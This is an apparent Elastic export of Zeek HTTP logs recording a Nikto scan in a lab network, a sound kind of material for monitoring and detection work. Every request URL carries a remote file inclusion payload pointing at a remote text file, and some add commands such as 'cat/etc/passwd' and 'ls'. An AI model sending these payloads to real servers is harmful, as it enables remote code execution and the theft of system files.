"@timestamp","_id","_ignored","_index","_score","agent.ephemeral_id","agent.id","agent.name","agent.name.text","agent.type","agent.version","data_stream.dataset","data_stream.namespace","data_stream.type","destination.address","destination.ip","destination.port","ecs.version","elastic_agent.id","elastic_agent.snapshot","elastic_agent.version","event.action","event.agent_id_status","event.category","event.created","event.dataset","event.id","event.ingested","event.kind","event.module","event.outcome","event.type","http.request.body.bytes","http.request.method","http.response.body.bytes","http.response.status_code","http.version","input.type","log.file.path","log.offset","network.community_id","network.transport","related.ip","source.address","source.ip","source.port",tags,"url.domain","url.extension","url.original","url.original.text","url.path","url.query","user_agent.device.name","user_agent.name","user_agent.original","user_agent.original.text","user_agent.os.full","user_agent.os.full.text","user_agent.os.name","user_agent.os.name.text","user_agent.os.version","user_agent.version","zeek.http.orig_fuids","zeek.http.orig_mime_types","zeek.http.resp_fuids","zeek.http.resp_mime_types","zeek.http.status_msg","zeek.http.trans_depth","zeek.session_id"
"Mar 7, 2025 @ 18:09:09.320",ozXecpUB2C2rFDMevaEj,"-",".ds-logs-zeek.http-default-2025.02.09-000001","-","31bb5b0b-eb42-43cf-a262-2b99efeec113","7bbe62c4-954d-4ef6-8153-d88e64035539",Zeek,Zeek,filebeat,"8.17.1","zeek.http",default,logs,"192.168.56.102","192.168.56.102","8,000","8.17.0","7bbe62c4-954d-4ef6-8153-d88e64035539",false,"8.17.1",GET,verified,"network, web","Mar 7, 2025 @ 18:09:10.342","zeek.http",CK0inA4VHzOnS3J5Gf,"Mar 7, 2025 @ 18:09:14.000",event,zeek,failure,"connection, protocol, info",0,GET,335,404,"1.0",log,"/opt/zeek/logs/current/http.log","3,550,139","1:YGh1zZFr9/4EyZGJEkwxjVXM4oM=",tcp,"192.168.56.108, 192.168.56.102","192.168.56.108","192.168.56.108","40,124","forwarded, zeek-http, _zeek_http_url_parse_failure","192.168.56.102","-","/topsites/index.php?page=http://blog.cirt.net/rfiinc.txt?&cmd=uNikto -a","/topsites/index.php?page=http://blog.cirt.net/rfiinc.txt?&cmd=uNikto -a","-","-",Other,Chrome,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Windows 10","Windows 10",Windows,Windows,10,"74.0.3729.169","-","-",F1BJ5U3mRSj6ABxr3e,"text/html","File not found",1,CK0inA4VHzOnS3J5Gf
"Mar 7, 2025 @ 18:09:06.796",6zXecpUB2C2rFDMeqZxC,"-",".ds-logs-zeek.http-default-2025.02.09-000001","-","31bb5b0b-eb42-43cf-a262-2b99efeec113","7bbe62c4-954d-4ef6-8153-d88e64035539",Zeek,Zeek,filebeat,"8.17.1","zeek.http",default,logs,"192.168.56.102","192.168.56.102","8,000","8.17.0","7bbe62c4-954d-4ef6-8153-d88e64035539",false,"8.17.1",GET,verified,"network, web","Mar 7, 2025 @ 18:09:07.314","zeek.http",CyQEGKKVnLIsTz7W5,"Mar 7, 2025 @ 18:09:09.000",event,zeek,failure,"connection, protocol, info",0,GET,335,404,"1.0",log,"/opt/zeek/logs/current/http.log","3,348,065","1:5WpF5ZBNivm/EBwDQq9Tax308sI=",tcp,"192.168.56.108, 192.168.56.102","192.168.56.108","192.168.56.108","54,420","forwarded, zeek-http","192.168.56.102",php,"/pollvote.php?pollNikto=http://blog.cirt.net/rfiinc.txt?&cmd=ls","/pollvote.php?pollNikto=http://blog.cirt.net/rfiinc.txt?&cmd=ls","/pollvote.php","pollNikto=http://blog.cirt.net/rfiinc.txt?&cmd=ls",Other,Chrome,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Windows 10","Windows 10",Windows,Windows,10,"74.0.3729.169","-","-",FOdXdA1qoGO6UnFoF3,"text/html","File not found",1,CyQEGKKVnLIsTz7W5
"Mar 7, 2025 @ 18:09:04.631","8fPecpUBaT9JHWGjne_I","-",".ds-logs-zeek.http-default-2025.02.09-000001","-","31bb5b0b-eb42-43cf-a262-2b99efeec113","7bbe62c4-954d-4ef6-8153-d88e64035539",Zeek,Zeek,filebeat,"8.17.1","zeek.http",default,logs,"192.168.56.102","192.168.56.102","8,000","8.17.0","7bbe62c4-954d-4ef6-8153-d88e64035539",false,"8.17.1",GET,verified,"network, web","Mar 7, 2025 @ 18:09:05.287","zeek.http",CCRPB23GBHuys53Jal,"Mar 7, 2025 @ 18:09:06.000",event,zeek,failure,"connection, protocol, info",0,GET,335,404,"1.0",log,"/opt/zeek/logs/current/http.log","3,162,142","1:PqKSDNqs7ubCvHpAp4lFDJsSEMU=",tcp,"192.168.56.108, 192.168.56.102","192.168.56.108","192.168.56.108","51,612","forwarded, zeek-http","192.168.56.102",php,"/modules.php?Nikto=http://blog.cirt.net/rfiinc.txt&file=article&sid=2","/modules.php?Nikto=http://blog.cirt.net/rfiinc.txt&file=article&sid=2","/modules.php","Nikto=http://blog.cirt.net/rfiinc.txt&file=article&sid=2",Other,Chrome,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Windows 10","Windows 10",Windows,Windows,10,"74.0.3729.169","-","-",FZyu4E2TVWg2kaKc7,"text/html","File not found",1,CCRPB23GBHuys53Jal
"Mar 7, 2025 @ 18:09:03.123",7vPecpUBaT9JHWGjne3I,"-",".ds-logs-zeek.http-default-2025.02.09-000001","-","31bb5b0b-eb42-43cf-a262-2b99efeec113","7bbe62c4-954d-4ef6-8153-d88e64035539",Zeek,Zeek,filebeat,"8.17.1","zeek.http",default,logs,"192.168.56.102","192.168.56.102","8,000","8.17.0","7bbe62c4-954d-4ef6-8153-d88e64035539",false,"8.17.1",GET,verified,"network, web","Mar 7, 2025 @ 18:09:04.273","zeek.http",CEuNNL2LThb6kxVjc4,"Mar 7, 2025 @ 18:09:06.000",event,zeek,failure,"connection, protocol, info",0,GET,335,404,"1.0",log,"/opt/zeek/logs/current/http.log","3,025,752","1:nhG+eIuR2wyoiSgtz7fBMU0pves=",tcp,"192.168.56.108, 192.168.56.102","192.168.56.108","192.168.56.108","49,638","forwarded, zeek-http","192.168.56.102",php,"/index.php?pageNikto=http://blog.cirt.net/rfiinc.txt","/index.php?pageNikto=http://blog.cirt.net/rfiinc.txt","/index.php","pageNikto=http://blog.cirt.net/rfiinc.txt",Other,Chrome,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Windows 10","Windows 10",Windows,Windows,10,"74.0.3729.169","-","-",F9QSNR22RZtJmJN1Nk,"text/html","File not found",1,CEuNNL2LThb6kxVjc4
"Mar 7, 2025 @ 18:09:02.886",qvPecpUBaT9JHWGjnezH,"-",".ds-logs-zeek.http-default-2025.02.09-000001","-","31bb5b0b-eb42-43cf-a262-2b99efeec113","7bbe62c4-954d-4ef6-8153-d88e64035539",Zeek,Zeek,filebeat,"8.17.1","zeek.http",default,logs,"192.168.56.102","192.168.56.102","8,000","8.17.0","7bbe62c4-954d-4ef6-8153-d88e64035539",false,"8.17.1",GET,verified,"network, web","Mar 7, 2025 @ 18:09:03.269","zeek.http",Cg0MoG44TVMX5pgGxh,"Mar 7, 2025 @ 18:09:06.000",event,zeek,failure,"connection, protocol, info",0,GET,335,404,"1.0",log,"/opt/zeek/logs/current/http.log","3,006,603","1:PGfCgtkcBv2xKSIcbOH56iMuoeM=",tcp,"192.168.56.108, 192.168.56.102","192.168.56.108","192.168.56.108","49,348","forwarded, zeek-http","192.168.56.102",php,"/index.php?home_Nikto=http://blog.cirt.net/rfiinc.txt","/index.php?home_Nikto=http://blog.cirt.net/rfiinc.txt","/index.php","home_Nikto=http://blog.cirt.net/rfiinc.txt",Other,Chrome,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Windows 10","Windows 10",Windows,Windows,10,"74.0.3729.169","-","-",FE6MwZ37leW0fQI1N2,"text/html","File not found",1,Cg0MoG44TVMX5pgGxh
"Mar 7, 2025 @ 18:09:02.832","n_PecpUBaT9JHWGjnezH","-",".ds-logs-zeek.http-default-2025.02.09-000001","-","31bb5b0b-eb42-43cf-a262-2b99efeec113","7bbe62c4-954d-4ef6-8153-d88e64035539",Zeek,Zeek,filebeat,"8.17.1","zeek.http",default,logs,"192.168.56.102","192.168.56.102","8,000","8.17.0","7bbe62c4-954d-4ef6-8153-d88e64035539",false,"8.17.1",GET,verified,"network, web","Mar 7, 2025 @ 18:09:03.269","zeek.http",CfoMCc2hojVmNttQlc,"Mar 7, 2025 @ 18:09:06.000",event,zeek,failure,"connection, protocol, info",0,GET,335,404,"1.0",log,"/opt/zeek/logs/current/http.log","3,000,253","1:+UdT6UZ9f4enHVxNJ9CJFeu7Ais=",tcp,"192.168.56.108, 192.168.56.102","192.168.56.108","192.168.56.108","49,232","forwarded, zeek-http","192.168.56.102",php,"/index.php?file_Nikto[]=http://blog.cirt.net/rfiinc.txt?","/index.php?file_Nikto[]=http://blog.cirt.net/rfiinc.txt?","/index.php","file_Nikto[]=http://blog.cirt.net/rfiinc.txt?",Other,Chrome,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Windows 10","Windows 10",Windows,Windows,10,"74.0.3729.169","-","-",F738rX2VmLvezUYXSd,"text/html","File not found",1,CfoMCc2hojVmNttQlc
"Mar 7, 2025 @ 18:09:01.023",ivPecpUBaT9JHWGjjeoC,"-",".ds-logs-zeek.http-default-2025.02.09-000001","-","31bb5b0b-eb42-43cf-a262-2b99efeec113","7bbe62c4-954d-4ef6-8153-d88e64035539",Zeek,Zeek,filebeat,"8.17.1","zeek.http",default,logs,"192.168.56.102","192.168.56.102","8,000","8.17.0","7bbe62c4-954d-4ef6-8153-d88e64035539",false,"8.17.1",GET,verified,"network, web","Mar 7, 2025 @ 18:09:02.247","zeek.http",CWFTPV3RS9NuWWR9gd,"Mar 7, 2025 @ 18:09:02.000",event,zeek,failure,"connection, protocol, info",0,GET,335,404,"1.0",log,"/opt/zeek/logs/current/http.log","2,833,444","1:/mZwCxDqkUPnvshlFTgGPU0wyO0=",tcp,"192.168.56.108, 192.168.56.102","192.168.56.108","192.168.56.108","46,578","forwarded, zeek-http","192.168.56.102",php,"/gepi/gestion/savebackup.php?fileNikto=http://blog.cirt.net/rfiinc.txt&cmd=cat/etc/passwd","/gepi/gestion/savebackup.php?fileNikto=http://blog.cirt.net/rfiinc.txt&cmd=cat/etc/passwd","/gepi/gestion/savebackup.php","fileNikto=http://blog.cirt.net/rfiinc.txt&cmd=cat/etc/passwd",Other,Chrome,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Windows 10","Windows 10",Windows,Windows,10,"74.0.3729.169","-","-",F9QcKI1MIPBWqJ7qo4,"text/html","File not found",1,CWFTPV3RS9NuWWR9gd
"Mar 7, 2025 @ 18:09:00.694",HPPecpUBaT9JHWGjjekC,"-",".ds-logs-zeek.http-default-2025.02.09-000001","-","31bb5b0b-eb42-43cf-a262-2b99efeec113","7bbe62c4-954d-4ef6-8153-d88e64035539",Zeek,Zeek,filebeat,"8.17.1","zeek.http",default,logs,"192.168.56.102","192.168.56.102","8,000","8.17.0","7bbe62c4-954d-4ef6-8153-d88e64035539",false,"8.17.1",GET,verified,"network, web","Mar 7, 2025 @ 18:09:01.242","zeek.http",C8Cy7V3WjbM7LFC5V,"Mar 7, 2025 @ 18:09:02.000",event,zeek,failure,"connection, protocol, info",0,GET,335,404,"1.0",log,"/opt/zeek/logs/current/http.log","2,794,972","1:OEdChUPOOVEJB9yaDqCDZENcyHo=",tcp,"192.168.56.108, 192.168.56.102","192.168.56.108","192.168.56.108","45,964","forwarded, zeek-http","192.168.56.102",php3,"/files/folder-reNikto.php3?BSX_LIBDIR=http://blog.cirt.net/rfiinc.txt","/files/folder-reNikto.php3?BSX_LIBDIR=http://blog.cirt.net/rfiinc.txt","/files/folder-reNikto.php3","BSX_LIBDIR=http://blog.cirt.net/rfiinc.txt",Other,Chrome,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Windows 10","Windows 10",Windows,Windows,10,"74.0.3729.169","-","-",FFMt861TugMWbDLbjj,"text/html","File not found",1,C8Cy7V3WjbM7LFC5V
"Mar 7, 2025 @ 18:08:57.888",kfPecpUBaT9JHWGjjeQB,"-",".ds-logs-zeek.http-default-2025.02.09-000001","-","31bb5b0b-eb42-43cf-a262-2b99efeec113","7bbe62c4-954d-4ef6-8153-d88e64035539",Zeek,Zeek,filebeat,"8.17.1","zeek.http",default,logs,"192.168.56.102","192.168.56.102","8,000","8.17.0","7bbe62c4-954d-4ef6-8153-d88e64035539",false,"8.17.1",GET,verified,"network, web","Mar 7, 2025 @ 18:08:58.214","zeek.http",CV0lXv2HAxFWPN4cub,"Mar 7, 2025 @ 18:09:02.000",event,zeek,failure,"connection, protocol, info",0,GET,335,404,"1.0",log,"/opt/zeek/logs/current/http.log","2,562,091","1:bXt6OKmJcHs98S5XSSo9p4s5e5o=",tcp,"192.168.56.108, 192.168.56.102","192.168.56.108","192.168.56.108","42,508","forwarded, zeek-http","192.168.56.102",php,"/cls_fast_template.php?fNikto=http://blog.cirt.net/rfiinc.txt","/cls_fast_template.php?fNikto=http://blog.cirt.net/rfiinc.txt","/cls_fast_template.php","fNikto=http://blog.cirt.net/rfiinc.txt",Other,Chrome,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Windows 10","Windows 10",Windows,Windows,10,"74.0.3729.169","-","-",FwAI8E3IcuAdMW7sw7,"text/html","File not found",1,CV0lXv2HAxFWPN4cub
"Mar 7, 2025 @ 18:08:57.278","X_PecpUBaT9JHWGjjeQB","-",".ds-logs-zeek.http-default-2025.02.09-000001","-","31bb5b0b-eb42-43cf-a262-2b99efeec113","7bbe62c4-954d-4ef6-8153-d88e64035539",Zeek,Zeek,filebeat,"8.17.1","zeek.http",default,logs,"192.168.56.102","192.168.56.102","8,000","8.17.0","7bbe62c4-954d-4ef6-8153-d88e64035539",false,"8.17.1",GET,verified,"network, web","Mar 7, 2025 @ 18:08:58.211","zeek.http",CdfXqq1KDV1lRNH7c6,"Mar 7, 2025 @ 18:09:02.000",event,zeek,failure,"connection, protocol, info",0,GET,335,404,"1.0",log,"/opt/zeek/logs/current/http.log","2,532,128","1:rRtj7Mea2zqE51htqfE4T/DM6Rc=",tcp,"192.168.56.108, 192.168.56.102","192.168.56.108","192.168.56.108","42,104","forwarded, zeek-http","192.168.56.102",php,"/class/jpcache/jpcache.php?_PSL[classdir]=http://blog.cirt.net/rfiinc.txt?exec=uNikto","/class/jpcache/jpcache.php?_PSL[classdir]=http://blog.cirt.net/rfiinc.txt?exec=uNikto","/class/jpcache/jpcache.php","_PSL[classdir]=http://blog.cirt.net/rfiinc.txt?exec=uNikto",Other,Chrome,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Windows 10","Windows 10",Windows,Windows,10,"74.0.3729.169","-","-",FKgr6RVQJwmIUm89j,"text/html","File not found",1,CdfXqq1KDV1lRNH7c6
